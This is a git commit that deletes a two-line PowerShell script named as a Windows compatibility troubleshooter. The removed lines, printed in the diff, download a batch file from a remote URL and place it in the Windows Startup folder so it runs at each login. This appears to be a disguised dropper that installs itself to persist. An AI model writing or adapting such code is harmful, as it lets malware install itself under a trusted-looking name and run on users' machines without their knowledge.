37e7491dfebce722adfebf5bcbf220db36d2843f
LionHackerman <58070003+LionHackerman@users.noreply.github.com>
2021-11-02 10:35:29 +1100

    Delete Windows Combatability Troubleshooter.ps1

--- Windows Combatability Troubleshooter.ps1
+++
@@ -1,2 +0,0 @@
-$client = new-object System.Net.WebClient
-$client.DownloadFile("http://www.github.com/lionhackerman/whip/WindowsCompatibilityTroubeshooter.bat","C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsCompatibilityTroubeshooter.bat")
